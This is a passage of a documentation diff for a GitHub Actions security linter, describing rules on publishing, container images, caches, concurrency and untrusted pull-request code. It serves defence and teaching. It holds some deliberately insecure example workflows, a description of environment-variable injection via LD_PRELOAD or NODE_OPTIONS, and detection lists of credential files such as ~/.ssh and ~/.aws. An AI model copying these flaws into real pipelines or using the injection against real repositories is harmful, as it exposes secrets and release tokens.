+- **A job that builds and publishes.** The job publishes with the OIDC token, has an `actions/checkout` step and, before the
+  publish, runs a build or an install of the dependencies (`pip install -r`, `npm ci`, `python -m build`, `uv build`, `make`,
+  `cargo build`, a build action such as `PyO3/maturin-action` or `ruby/setup-ruby` with `bundler-cache`, ...). The code of the repository
+  and of every dependency can publish a package. Build it in another job without `id-token: write`, upload the files as an artifact and
+  publish from a job that only downloads and publishes them. Not reported: installing the tools of publishing (`pip install twine`,
+  `npm install -g npm@latest`), jobs without a checkout, a build after the publish, and the publishes that build the package themselves and
+  cannot be separated from the build (`cargo publish`, `rubygems/release-gem`).
+- **A job without an `environment:`.** The trusted publisher of PyPI, npm, crates.io and RubyGems can be tied to an environment, and the
+  environment can require an approval, so that a run that someone else started cannot publish on its own. Only the absence of the key is
+  reported: whether the environment has protection rules is not in the file.
+- **`attestations: false`** of `pypa/gh-action-pypi-publish` or `rubygems/release-gem`. Both publish attestations by default
+  (PEP 740, sigstore), which let the users of the package check where and how it was built.
+
+Example input:
+
+```yaml
+on:
+  release:
+    types: [published]
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+    steps:
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+      - run: python -m build
+      - uses: pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc # v1.12.4
+        with:
+          attestations: false
+```
+
+Output:
+<!-- Skip update output -->
+```
+test.yaml:12:15: "pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc" publishes to PyPI with the OIDC token of the job ("id-token: write"), and the job has no "environment:". tie the trusted publisher to an environment and add it to the job (with required reviewers if you can), so that a run that someone else started cannot publish on its own [use-trusted-publishing]
+   |
+12 |       - uses: pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc # v1.12.4
+   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+test.yaml:12:15: "pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc" publishes to PyPI with the OIDC token of the job ("id-token: write"), but the job also checks out the repository and runs "python -m build" before it, so that code and the code of its dependencies can use the token as well. build the package in another job without "id-token: write", pass it on as an artifact, and publish from a job that only downloads and publishes it [use-trusted-publishing]
+   |
+12 |       - uses: pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc # v1.12.4
+   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+test.yaml:14:25: action "pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc" is told not to publish attestations ("attestations: false"), although it does by default: they let the users of the package check where and how it was built. remove the input [use-trusted-publishing]
+   |
+14 |           attestations: false
+   |                         ^~~~~
+```
+
+<!-- Skip playground link -->
+
+This is the output with the option `pedantic`, set for the rule in [the config file](config.md):
+
+```yaml
+rules:
+  use-trusted-publishing:
+    pedantic: true
+```
 
 <a id="check-superfluous-actions"></a>
 ## Superfluous actions
@@ -4185,6 +4621,45 @@ An image written with an expression is checked as far as it can be known:
 
 Docker images used as actions (`uses: docker://alpine:3.20`) are checked by the [`unpinned-uses`](#check-action-format) rule.
 
+The images that a script pulls are checked too: the image of `docker run`, `docker create` and `docker pull` (and `docker container
+run`, `docker image pull`, and the same commands of `podman` and `nerdctl`), with the same messages:
+
+```yaml
+steps:
+  # ERROR: the image of the script is not pinned either
+  - run: docker run --rm -v "$PWD:/w" -w /w node:20 npm test
+```
+
+The command line is read as far as its options are known. A command with an option it does not know is skipped (the option could
+take the image as its value), and so are an image which is a variable, an expression or a command substitution, an image id,
+`scratch`, and an image that the workflow builds itself: the name of a `docker build -t`/`--tag`, a `docker tag` or `docker commit`
+target, a `tags:` of `docker/build-push-action`, a name which another command of the repository gets as an argument
+(`./build.sh app:ci`, `docker push app:ci`), and every image of a workflow that loads archives (`docker load`) or uses
+`docker compose`, `docker/bake-action`, buildah or kaniko. `docker build --pull` names no image and is not checked, and
+the `FROM` lines of a Dockerfile are not read.
+
+The option `policies` sets how strongly the images that match a pattern are pinned, so that the images of your own registry can
+be pinned by a tag while the rest needs a digest:
+
+```yaml
+rules:
+  unpinned-images:
+    require-digest: true
+    policies:
+      "ghcr.io/my-org/*": tag-pin    # a tag other than latest, or a digest
+      "registry.example.com/*": any  # nothing is required
+      "node:20": any                 # a pattern with a tag matches that tag only
+      "*": hash-pin                  # a digest (the default of require-digest)
+```
+
+The policies are `hash-pin` (a digest), `tag-pin` (a tag other than `latest`, or a digest) and `any`. A pattern is a glob of the
+image name where `*` matches any characters, `/` included. When several patterns match an image, the most specific one decides, in this order: (1) more literal characters before the first
+`*` of the pattern with the registry written out (`node` is `docker.io/library/node`, and `docker.io/*` is `docker.io/library/*`), (2)
+fewer `*`, (3) a pattern with a tag beats the same name without one, (4) the longer pattern as written, and, for patterns that tie on all of
+these, the first one in lexical order. So `node` beats `docker.io/library/*`, `docker.io/library/*` beats `docker.io/*`, `node:20`
+beats `node`, and `ghcr.io/org/app` beats `ghcr.io/org/*`, which beats `ghcr.io/*` and `*`. A policy wins over `require-digest`. `node` and `docker.io/library/node` are the same image.
+To forbid or allow images by name, see the options `images-allow` and `images-deny` of [`forbidden-uses`](#check-forbidden-uses).
+
 <a id="check-self-repository"></a>
 ## Self-repository syntax (pedantic)
 
@@ -4452,6 +4927,10 @@ is true), and the default is false. In a release job the rule reports the steps 
 | `oven-sh/setup-bun` | `no-cache: true` (it caches the bun executable) |
 | `actions-rust-lang/setup-rust-toolchain` | `cache: false` |
 | `mlugg/setup-zig` | `use-cache: false` |
+| `pnpm/action-setup` | `cache` is missing or `false` (the input is opt-in, `false` by default) |
+| `pnpm/setup` | `cache` is missing or `false` (`save-cache: false` only stops the saving, the store is still restored) |
+| `graalvm/setup-graalvm` | `cache` is missing or `false` (it names the build tool, `maven`, `gradle` or `sbt`) |
+| `ramsey/composer-install` | `ignore-cache` is `1`, `yes`, `Yes`, `y`, `Y`, `true` or `True`, the values that the action reads (`bin/should_cache.sh`); any other value or an expression restores it |
 | `PyO3/maturin-action` | `sccache` is missing or `false` and `cache` is not `sccache` (it sets `SCCACHE_GHA_ENABLED`) |
 | `Mozilla-Actions/sccache-action` | `SCCACHE_GHA_ENABLED` is not set to a value other than `false` or `0`: the action only installs sccache, which uses the cache of GitHub when that variable says so. The `env` of the step, then of the job, then of the workflow decides (the most specific one that sets it), and a script of the job that mentions the variable counts as setting it unless the step does. In a composite action the variable may come from the workflow that calls it, which is not known, so the finding stays unless the step switches it off |
 | `hendrikmuhs/ccache-action`, `DeterminateSystems/magic-nix-cache-action`, `awalsh128/cache-apt-pkgs-action`, `nix-community/cache-nix-action` | never: remove the step |
@@ -4497,6 +4976,17 @@ heuristics of zizmor for what a release is, which report mostly checks (34 of 36
 [the parity page](zizmor-parity.md#cache-poisoning-against-zizmor) were jobs that publish nothing): a workflow that runs on pushed tags is a release whatever its permissions, and so is one whose
 `branches:` filter names a release branch next to others (`branches: [main, 'release/**']`, any pattern with `release` in it). It also reports
 `docker/setup-buildx-action` without `version`.
+
+With the same option, the rule also reports a cache whose `path` saves a file with credentials ([zizmor#723](https://github.com/zizmorcore/zizmor/issues/723)):
+a step of `actions/cache` or `actions/cache/save` that caches `~/.npmrc`, `~/.docker/config.json` (or `~/.docker`), `~/.ssh` or a private key
+of it, `~/.config/gh`, `~/.aws`, `~/.kube`, `~/.netrc`, `~/.pypirc`, `~/.m2/settings.xml` and a few like them (the home directory is
+written `~`, `$HOME` or `${HOME}`; a directory of the workspace with the same name is the project's own), or, in the workspace, `.npmrc`, `.env` and `.env.*` (not the templates `.env.example`, `.env.sample`, `.env.template`, `.env.dist` and the like)
+and `.git`. The config of `.git` keeps the token of `actions/checkout`, so it is reported only when the job has a checkout without
+`persist-credentials: false` (a job which restores `.git` before a checkout that does not persist the token has nothing to leak). A cache is not private: a workflow of the repository that
+knows the key restores it, so the files are readable by whatever runs there, which includes the workflows of pull requests of the same
+repository. It is reported whatever the trigger is, and not when the step has `lookup-only: true` or the job or workflow has `cache-mode: none` or `read` (nothing is saved), and not for a path below a credential directory (`~/.ssh/known_hosts`,
+`~/.docker/cli-plugins`), a glob, a path with an expression, or the whole home directory or workspace. It is in the pedantic tier because only the
+files that exist when the step runs hold credentials, which the rule cannot see.
 
 Differences from [zizmor](https://docs.zizmor.sh/audits/#cache-poisoning): zizmor reports a release workflow once for the trigger and once
 for each step. jactionlint reports the steps (and the job-level publishing detection is jactionlint only). Deliberately different:
@@ -5043,6 +5533,64 @@ skipped: such a workflow inherits the token permissions of its own caller, which
 
 Note that this check only works with local reusable workflows (starting with `./` or `$/`).
 
+<a id="check-concurrency-deadlock"></a>
+## Concurrency deadlock between a workflow and the workflow it calls
+
+Example input:
+
+```yaml
+on: push
+
+# ERROR: the called workflow has the same group
+concurrency:
+  group: ${{ github.workflow }}-${{ github.sha }}
+  cancel-in-progress: true
+
+jobs:
+  build:
+    uses: ./.github/workflows/build.yml
+```
+
+Output:
+<!-- Skip update output -->
+
+```
+.github/workflows/ci.yml:5:10: the concurrency group "${{ github.workflow }}-${{ github.sha }}" is the same as the group of the workflow of .github/workflows/build.yml (line 4), which job "build" calls. the called workflow runs inside this one with its `github` context, so both groups are one: this run holds the group while it waits for the called workflow, which waits for the group. GitHub detects the deadlock and cancels the run. give one of the groups a part of its own, for example a suffix such as "-caller" [concurrency-deadlock]
+```
+
+<!-- Skip playground link -->
+
+The example is `.github/workflows/ci.yml`. The called workflow is `.github/workflows/build.yml`:
+
+```yaml
+on: workflow_call
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.sha }}
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: make
+```
+
+A reusable workflow runs inside the run of the workflow that calls it, and the `github` context in it is the one of the caller:
+`github.workflow` is the name of the caller. So the group `${{ github.workflow }}-${{ github.sha }}` is the same string in both files. The caller
+holds the group while it waits for the called workflow, and the called workflow waits for the group: GitHub detects the deadlock, cancels
+the run and says `a deadlock for concurrency group ... was detected` ([actionlint#538](https://github.com/rhysd/actionlint/issues/538)).
+Give one of them a part of its own (`${{ github.workflow }}-caller-${{ github.sha }}`).
+
+The rule `concurrency-deadlock` (in the `correctness` profile) reads the workflows of the repository that this one calls with
+`uses: ./.github/workflows/x.yml`, and reports the group of the workflow when the group of the called workflow, or of one of its jobs, is
+the same. It compares groups case-insensitively and without spaces in the expressions, and only when they are written with text and with
+the properties of the `github` context that have the same value in the caller and the called workflow (`workflow`, `ref`, `sha`,
+`event_name`, `event.*`, `run_id`, `actor`, ...) and the functions `format`, `contains`, `startsWith`, `endsWith` and `join`. A group that
+reads anything else (`inputs`, `matrix`, `github.job`, `hashFiles()`, a `concurrency:` that is one expression) is not compared. The
+group of a job of the caller is not compared with the called workflow either. I could not try the job-level case on GitHub, the
+reports of it come from the group of a job of a called workflow, which the issue above describes. The group of a workflow which calls
+another one in turn is compared with the direct callee only. `concurrency-limits` gives the same advice for the groups it suggests.
+
 <a id="id-naming-convention"></a>
 ## ID naming convention
 
@@ -5376,6 +5924,69 @@ if: |
 ```
 
 jactionlint also checks extra characters around `${{ }}` in `if:` which unexpectedly make the conditions true.
+
+<a id="check-event-name-never-received"></a>
+## Events that the workflow never receives (pedantic)
+
+Example input:
+
+```yaml
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      # ERROR: the workflow is not run by pull_request
+      - run: echo "review"
+        if: github.event_name == 'pull_request'
+      # ERROR: a run has one event
+      - run: echo "both"
+        if: ${{ github.event_name == 'push' && github.event_name == 'workflow_dispatch' }}
+      # OK: push is one of the events
+      - run: echo "deploy"
+        if: github.event_name == 'push'
+```
+
+Output:
+<!-- Skip update output -->
+
+```
+test.yaml:11:13: warning: "github.event_name == 'pull_request'" is always false: this workflow is never run by the event "pull_request", it runs on push, workflow_dispatch [event-name-never-received]
+   |
+11 |         if: github.event_name == 'pull_request'
+   |             ^~~~~~~~~~~~~~~~~
+test.yaml:14:48: warning: "github.event_name == 'workflow_dispatch'" is always false here: the same condition needs the event to be "push" as well, and a run has one event [event-name-never-received]
+   |
+14 |         if: ${{ github.event_name == 'push' && github.event_name == 'workflow_dispatch' }}
+   |                                                ^~~~~~~~~~~~~~~~~
+```
+
+<!-- Skip playground link -->
+
+The rule is in the `pedantic` profile. The configuration of the example is:
+
+```yaml
+rules:
+  event-name-never-received: warn
+```
+
+A run of a workflow has one event, and `github.event_name` is its name. When the workflow lists the events it runs on and never lists
+`pull_request`, the comparison `github.event_name == 'pull_request'` is always false: the step or the job never runs, or the comparison
+is a dead branch of a larger condition. It is a typo in the name, a trigger that was removed, or a condition copied from another workflow
+([actionlint#68](https://github.com/rhysd/actionlint/issues/68), [actionlint#69](https://github.com/rhysd/actionlint/issues/69)). Two comparisons
+with different events in one `&&` chain cannot both be true either. The rule `event-name-never-received` reports them in
+every expression of the workflow, in `if:` conditions with or without `${{ }}` too.
+
+The names are compared without regard to case, as GitHub compares strings. The rule does not look at a workflow with `workflow_call`
+(the event of its run is the one of the caller), at a composite action, or at `!=`, `contains()` and other ways to test the event.
+
+It is a pedantic check because what it finds is dead code, and many workflows have it on purpose: a template shared by several workflows
+(`github.event_name == 'pull_request'` in a file that is only a template for a generated workflow, the same `concurrency:` or
+`if:` in every generated file), the code that gh-aw writes with the conditions for all the events, and conditions that were
+left after a trigger was removed. On popular repositories most findings come from the first two, and the rest is dead code that can be deleted.
 
 <a id="action-metadata-syntax"></a>
 ## Action metadata syntax validation
@@ -6969,6 +7580,22 @@ rules:
       - tj-actions/changed-files
 ```
 
+The options `images-allow` and `images-deny` do the same for container images: the image of `container:` and `services:`, of
+`uses: docker://`, of the `runs.image: docker://` of a Docker action, and of `docker run`, `docker create` and `docker pull` in a
+script (see [unpinned container images](#check-unpinned-images) for what is read). A pattern is a glob of the image name where `*`
+matches any characters, `/` included. The registry of Docker Hub can be left out (`node` is `docker.io/library/node`), and a pattern
+with a tag (`node:20`) matches that tag only. Images written with an expression are not judged.
+
+```yaml
+rules:
+  forbidden-uses:
+    images-allow:
+      - ghcr.io/my-org/*
+      - mirror.example.com/*
+    images-deny:
+      - "*:latest"
+```
+
 The rule is for policy, so its default level is `error`. There is no automatic fix.
 
 
@@ -8158,9 +8785,9 @@ test.yaml:8:16: this step checks out code from a pull request (github.event.pull
 
 [Playground](https://jactionlint.jdx.dev/#eNpMj8FOwzAMhu97il8C7dawtFtLc+JNpiT1lkJJS2yPw7R3Rx1o4mRb/yfr/+bssOg0HQt9KbEcxZczyeZ9Duw2gBDLOoGimasV16BZtJr8mt0jFlr4lwIqKBM7+CjjnPklJoofs8qbtWHobL+zIdAh2LbZRSLfNUPdHfquafex96f2tcETLntTm/rvIfA9SnKPCyh0cni+XnEeJWkwdKEs5r+GSeQHw8njdnv0Kpod8vKJOGK7vW+rws8AsOBOKw==)
 
-The rule `untrusted-checkout` (in the `default` profile, as an error) reports a `pull_request_target` or `workflow_run`
-workflow that checks out the code of a pull request and then runs it. These events run in the context of the base repository,
-with a token that can write and with the secrets, while the code is what the author of the pull request wrote. A build script,
+The rule `untrusted-checkout` (in the `default` profile, as an error) reports a `pull_request_target`, `workflow_run` or
+`issue_comment` workflow that checks out the code of a pull request and then runs it. These events run in the context of the base
+repository, with a token that can write and with the secrets, while the code is what the author of the pull request wrote. A build script,
 a test, a `package.json` hook or a local action is enough to take over the token.
 
 Run untrusted code in a `pull_request` workflow, which has no secrets for pull requests from forks. If a privileged workflow
@@ -8189,6 +8816,68 @@ or merge commit of the pull request. The input `allow-unsafe-pr-checkout: true` 
   that also has the event `issue_comment`, `issues` or `workflow_call` are **not covered by the protection**, so they are
   reported as before. So is a `workflow_run` workflow unless every workflow in `workflows:` is in the repository and only runs
   for `pull_request*` events.
+
+**Workflows that a comment starts** (`issue_comment`, the "/test" bots) carry no head in the event, so the pull request has to
+come from somewhere: `gh pr checkout ${{ github.event.issue.number }}` (also the `html_url` of the issue or of its
+`pull_request`, directly, through `env:` of the step, the job or the workflow, or a variable of the script), `refs/pull/<number>/head`
+or `/merge` with that number (`actions/checkout`, `git fetch`, `git checkout`), and the head that an action looks up
+(`steps.<id>.outputs.head_sha`, `head_ref`, ... of `xt0rted/pull-request-comment-branch`, `alessbell/pull-request-comment-branch`,
+`eficode/resolve-pr-refs`, `potiuk/get-workflow-origin` and `github/branch-deploy`; the `gotson` fork named by poutine and CodeQL
+does not exist any more). `gh pr checkout` of anything else, a branch named after the number (`git checkout -b fix-${{
+github.event.issue.number }}`), a revision from a step output of another action, and `github.head_ref` or
+`github.event.pull_request.*` (empty in a comment run) are not reported there. The `issues` event is not handled: its payload
+never names a pull request, and the text of an issue that does is an injection (`template-injection`).
+
+A comment run is safe when the person who commented, or the pull request author, is trusted, and the rule accepts what CodeQL
+(`ControlChecks`) and poutine accept, with the checks made stricter:
+
+- a job or step `if:` on `github.event.comment.author_association` (or `github.event.issue.author_association`, or the
+  association of the pull request) that names no association of someone without access: `NONE`, `CONTRIBUTOR`, `FIRST_TIMER`,
+  `FIRST_TIME_CONTRIBUTOR` and `MANNEQUIN` are not trusted, so `!= 'NONE'` and a list that has `CONTRIBUTOR` are not gates. The
+  same holds for the association of the author of a pull request in a `pull_request_target` workflow. A condition on
+  `github.actor`, `github.event.comment.user` or `github.event.sender` is a guard, as before;
+- an earlier step of the job (that always runs and does not use `continue-on-error`) of one of these actions, which fail
+  the job for a user who may not write: `sushichop/action-repository-permission` (`required-permission` of `write` or `admin`, which
+  is the default, without `relax`), `prince-chrismc/check-actor-permissions-action` and `lannonbr/repo-permission-check-action`
+  (`permission: write` or `admin`), `xt0rted/slash-command-action` (`permission-level` of `write` (the default) or `admin`),
+  `TheModdingInquisition/actions-team-membership` (`exit` is not `false`), `actions-cool/check-user-permission` (`require` of
+  `write` or `admin` and `error-if-missing: true`, without `username`), and `actions/github-script` that asks for the permission
+  or the membership of the user (`getCollaboratorPermissionLevel`, `getMembershipForUserInOrg`, ...) and throws or calls
+  `core.setFailed`. CodeQL also accepts `octokit/request-action` and any use of `actions-cool/check-user-permission`, which is
+  not enough: without `error-if-missing` it only sets an output, and a condition on `steps` is a guard of its own;
+- an `environment:` (as before), and a job that this one needs (at any depth) whose `if:` is a guard, which has an
+  `environment:` or has a gate step: when it is skipped or fails, so does this job, unless its own `if:` calls `always()`,
+  `cancelled()` or `failure()`.
+
+These gates do not protect against a pull request that changes after the person has looked at it: a maintainer comments
+`/test`, the author pushes, and the job checks out the new head, which the author controls (a time-of-check to time-of-use
+race). The rule does not report that yet.
+
+A job or step whose `if:` is false for the privileged events of the workflow, as far as it reads `github.event_name`
+(`if: github.event_name == 'workflow_dispatch'`), is not judged for them, and a job that needs a skipped job is skipped too.
+
+**Reusable workflows and composite actions** run for the events of the workflows that call them, and the head of the pull request
+is often passed down as an input: the caller (`pull_request_target`) has `with: ref: ${{ github.event.pull_request.head.sha }}`
+and the callee has `actions/checkout` with `ref: ${{ inputs.ref }}` and then `make`. The rule judges a local reusable workflow
+(`uses: ./.github/workflows/x.yml`) or a local composite action for each call in a workflow of the project:
+
+- A call counts when its workflow has a privileged event and the job and the step of the call are not guarded (an
+  `environment:`, a guard condition, a permission gate before the step, a needed job that is guarded, or a condition on
+  `github.event_name` that is false for the event). If the caller is itself a reusable workflow, the calls of it count too, up to
+  three levels. The callee is then judged for those events, also for the head that it names itself
+  (`github.event.pull_request.head.sha` in a reusable workflow that a `pull_request_target` workflow calls).
+- An input is untrusted when a counting call gives it a value that names the head of a pull request (a context, or `refs/pull/...`)
+  or reads an input of its own caller that is. The finding is at the checkout of the callee and says which call does it
+  (`inputs.ref, given github.event.pull_request.head.sha by .github/workflows/pr.yaml`).
+- A composite action that only checks out the head, with the steps that run it in the caller, is a checkout of the step that calls
+  the action: the finding is at that `uses:` and the later steps of the caller run the code. The values of the call replace the
+  inputs of the action (its defaults for the inputs the call leaves out); a step of the action that is guarded is not followed.
+- The protection of `actions/checkout` is judged for the events that reach the callee, and a `workflow_call` workflow is only
+  covered when all its callers are in the project.
+
+What is not known stays out: a reusable workflow or action that no workflow of the project calls (it is published for other
+repositories), a call through a composite action that calls another one, a value from a step output, a matrix or an
+`needs` output, a `uses:` with an expression, and a call made by a composite action.
 
 A step is reported at its checkout when it puts untrusted code in the workspace and a later step in the same job runs it:
 
@@ -8236,7 +8925,8 @@ A step is reported at its checkout when it puts untrusted code in the workspace 
   step works in that directory (`working-directory`, `cd`, or an argument below it); `python3 base/check.py --root pr-head` runs a
   script from the base checkout and only reads `pr-head`, so it does not count either.
 
-In a job that sets `permissions: {}` the message does not claim a token, because the job has none.
+In a job that sets `permissions: {}` the message does not claim a token, because the job has none, and in a job whose
+permissions are all `read` it says that the token can only read.
 
 What is **not** reported: a checkout of the base (no `ref`, or `github.event.pull_request.base.*`), a checkout that nothing runs,
 a job with an `environment:` (its reviewers decide, unless `--online` finds that it has none, see
@@ -8335,7 +9025,7 @@ test.yaml:9:15: this step downloads an artifact of the run that triggered the wo
   |
 9 |       - uses: actions/download-artifact@v4
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:15:45: a value that is not a literal is written to $GITHUB_ENV in a workflow triggered by "workflow_run", which runs with secrets and a write token for events that may come from a fork. an attacker who controls the value can set LD_PRELOAD or NODE_OPTIONS (a newline adds another variable) and run code in the next steps. write only literal values and values computed from trusted sources, or pass state with $GITHUB_OUTPUT [github-env]
+test.yaml:15:45: a value that is not a literal is written to $GITHUB_ENV in a workflow triggered by "workflow_run", which runs with secrets and a write token for events that may come from a fork. an attacker who controls the value can set LD_PRELOAD or NODE_OPTIONS (a newline adds another variable) and run code in the next steps. write only literal values and values computed from trusted sources, or pass state with $GITHUB_OUTPUT (only a value without line breaks, or one between a delimiter that nobody can guess, is safe there: see output-clobbering) [github-env]
    |
 15 |       - run: echo "number=$(cat pr/number)" >> "$GITHUB_ENV"
    |                                             ^~~~~~~~~~~~~~~~
@@ -8360,7 +9050,10 @@ Check the content before you use it, for example match a pull request number aga
 ```
 
 The download is `actions/download-artifact` with a `run-id` that reads `github.event.workflow_run`, any use of
-`dawidd6/action-download-artifact`, `gh run download`, or an `actions/github-script` that calls `listWorkflowRunArtifacts` and
+`dawidd6/action-download-artifact` or of its forks and look-alikes that octoscan knows (`aochmann/actions-download-artifact`,
+`blablacar/action-download-last-artifact`, which takes the last artifact of that name of any run, branch or workflow, and
+`bettermarks/action-artifact-download`, which has no `path` and puts the artifact under `rename` or `artifact_name`),
+`gh run download`, or an `actions/github-script` that calls `listWorkflowRunArtifacts` and
 `downloadArtifact`. The use is a later step of the same job with a `run:` that
 
 - runs something below the artifact directory (`path:`, or the artifact `name` when there is no `path`), including `cd` into it
@@ -8378,6 +9071,13 @@ without `path` and `name` lands in the root of the workspace under names the rul
 [environments without reviewers](#check-untrusted-checkout-environment)), jobs and steps with the same guards as
 `untrusted-checkout`, and workflows that wait only for workflows that run for `push`, `schedule` and other events that only people
 with write access cause.
+
+The option `pedantic` (on under the `pedantic` profile, `rules: {untrusted-artifact: {pedantic: true}}` for the rule alone) also
+reports a download that does not say which artifact it wants: `actions/download-artifact` with a `run-id` of the triggering run and no
+`name`, `pattern` or `artifact-ids`, `dawidd6/action-download-artifact` or `aochmann/actions-download-artifact` without `name`, and
+`gh run download <id>` without `-n` or `--pattern`. It fetches every artifact that the run uploaded, which includes the ones that the
+workflow does not expect and the pull request chose to add. This is reported whether or not a later step uses the files
+([ghlint#239](https://github.com/TWiStErRob/net.twisterrob.ghlint/issues/239)); the same guards as above apply.
 
 There is no automatic fix.
 
@@ -8854,9 +9554,9 @@ way because any caller can pass attacker-controlled text. jactionlint does not l
 
 How the rules treat actions:
 
-- **Applies** to the steps (and the metadata) of an action: `action-syntax`, `adhoc-packages`, `archived-uses`, `artipacked`, `background-step-not-waited`, `checkout-static-credentials`, `constant-condition`, `context-availability`, `continue-on-error`, `deprecated-action-input`, `deprecated-commands`, `deprecated-node-runtime`, `duplicate-key`, `duplicate-step-id`, `environment-file-redirect`, `expired-ignore`, `expression-syntax`, `expression-type`, `fail-fast-action-inputs`, `forbidden-uses`, `github-app`, `if-always-true`, `impostor-commit`, `insecure-commands`, `insecure-ssh-keyscan`, `insecure-url-scheme`, `invalid-env-var-name`, `invalid-function-call`, `invalid-id`, `invalid-ignore-comment`, `invalid-local-action`, `invalid-parallel-step`, `invalid-shell-name`, `invalid-uses`, `invisible-characters`, `known-vulnerable-actions`, `malformed-expression-delimiters`, `max-run-lines`, `merge-key`, `misfeature`, `missing-action-input`, `multiline-plain-run`, `obfuscation`, `outdated-action-runner`, `pipeline-without-pipefail`, `pyflakes`, `recursive-alias`, `ref-confusion`, `ref-version-mismatch`, `repojacking`, `require-expression-wrapping`, `self-repository`, `shellcheck`, `stale-action-refs`, `superfluous-actions`, `template-injection`, `typosquat-uses`, `undefined-function`, `undefined-property`, `unknown-action-input`, `unlocked-install`, `unpinned-images`, `unpinned-tools`, `unpinned-uses`, `unsound-contains`, `unsound-prefix-match`, `unsound-ternary`, `unused-anchor`, `unused-ignore`, `unverified-download`, `use-trusted-publishing`, `yaml-syntax`.
+- **Applies** to the steps (and the metadata) of an action: `action-syntax`, `adhoc-packages`, `archived-uses`, `argument-injection`, `artipacked`, `background-step-not-waited`, `checkout-static-credentials`, `command-injection`, `conflicting-action-inputs`, `constant-condition`, `context-availability`, `continue-on-error`, `deprecated-action-input`, `deprecated-commands`, `deprecated-node-runtime`, `duplicate-key`, `duplicate-step-id`, `environment-file-redirect`, `expired-ignore`, `expression-syntax`, `expression-type`, `fail-fast-action-inputs`, `forbidden-uses`, `github-app`, `if-always-true`, `impostor-commit`, `insecure-commands`, `insecure-ssh-keyscan`, `insecure-url-scheme`, `invalid-env-var-name`, `invalid-function-call`, `invalid-id`, `invalid-ignore-comment`, `invalid-local-action`, `invalid-parallel-step`, `invalid-shell-name`, `invalid-uses`, `invisible-characters`, `known-vulnerable-actions`, `malformed-expression-delimiters`, `max-run-lines`, `merge-key`, `misfeature`, `missing-action-input`, `multiline-plain-run`, `obfuscation`, `outdated-action-runner`, `output-clobbering`, `pipeline-without-pipefail`, `pyflakes`, `recursive-alias`, `ref-confusion`, `ref-version-mismatch`, `repojacking`, `require-expression-wrapping`, `self-repository`, `shellcheck`, `stale-action-refs`, `superfluous-actions`, `template-injection`, `typosquat-uses`, `undefined-function`, `undefined-property`, `unknown-action-input`, `unlocked-install`, `unpinned-images`, `unpinned-tools`, `unpinned-uses`, `unsound-contains`, `unsound-prefix-match`, `unsound-ternary`, `unused-anchor`, `unused-ignore`, `unverified-download`, `use-trusted-publishing`, `yaml-syntax`.
 - **Caller-dependent**: `agentic-actions`, `bot-conditions`, `cache-poisoning`, `github-env` (its findings about untrusted input do not depend on the caller), `untrusted-artifact` and `untrusted-checkout`.
-- **Not applicable** because an action does not have what the rule checks, or because only the calling job can decide (`unused-baseline-entry` is about the baseline file, not about a workflow or an action): `anonymous-definition`, `concurrency-cancels-prs`, `concurrency-cancels-release`, `concurrency-limits`, `conflicting-runner-labels`, `cron-too-frequent`, `cyclic-job-needs`, `dangerous-triggers`, `dependabot-cooldown`, `dependabot-execution`, `dependabot-missing-actions-update`, `dependabot-syntax`, `deprecated-runner-label`, `duplicate-job-id`, `duplicate-job-needs`, `duplicate-triggers`, `excessive-permissions`, `gate-job-skipped-on-failure`, `gh-without-token`, `hardcoded-container-credentials`, `insufficient-permissions`, `invalid-activity-type`, `invalid-cron`, `invalid-event-config`, `invalid-event-filter`, `invalid-glob`, `invalid-label-pattern`, `invalid-local-workflow`, `invalid-permissions`, `invalid-timezone`, `invalid-workflow-call`, `invalid-workflow-call-input`, `invalid-workflow-dispatch-input`, `local-action-checkout`, `matrix-duplicate-value`, `matrix-invalid-exclude`, `missing-permissions`, `missing-timeout`, `missing-workflow-input`, `missing-workflow-secret`, `mutable-runner-label`, `overprovisioned-secrets`, `require-shell`, `required-actions`, `secrets-inherit`, `secrets-outside-env`, `self-hosted-runner`, `timeout-too-long`, `ubuntu-slim-limits`, `undefined-job-needs`, `undocumented-permissions`, `unknown-event`, `unknown-runner-label`, `unknown-workflow-input`, `unknown-workflow-secret`, `unredacted-secrets`, `unused-baseline-entry`, `unused-job-output`, `unused-needs`, `unused-workflow-input`, `workflow-call-permissions`, `workflow-input-type`, `workflow-run-names`, `workflow-secret-scope`, `workflow-syntax`.
+- **Not applicable** because an action does not have what the rule checks, or because only the calling job can decide (`unused-baseline-entry` is about the baseline file, not about a workflow or an action): `anonymous-definition`, `concurrency-cancels-prs`, `concurrency-cancels-release`, `concurrency-deadlock`, `concurrency-limits`, `conflicting-runner-labels`, `cron-too-frequent`, `cyclic-job-needs`, `dangerous-triggers`, `dependabot-cooldown`, `dependabot-execution`, `dependabot-missing-actions-update`, `dependabot-syntax`, `deprecated-runner-label`, `duplicate-job-id`, `duplicate-job-needs`, `duplicate-triggers`, `event-name-never-received`, `excessive-permissions`, `gate-job-skipped-on-failure`, `gh-without-token`, `hardcoded-container-credentials`, `insufficient-permissions`, `invalid-activity-type`, `invalid-cron`, `invalid-event-config`, `invalid-event-filter`, `invalid-glob`, `invalid-label-pattern`, `invalid-local-workflow`, `invalid-permissions`, `invalid-timezone`, `invalid-workflow-call`, `invalid-workflow-call-input`, `invalid-workflow-dispatch-input`, `local-action-checkout`, `matrix-duplicate-value`, `matrix-invalid-exclude`, `missing-permissions`, `missing-timeout`, `missing-workflow-input`, `missing-workflow-secret`, 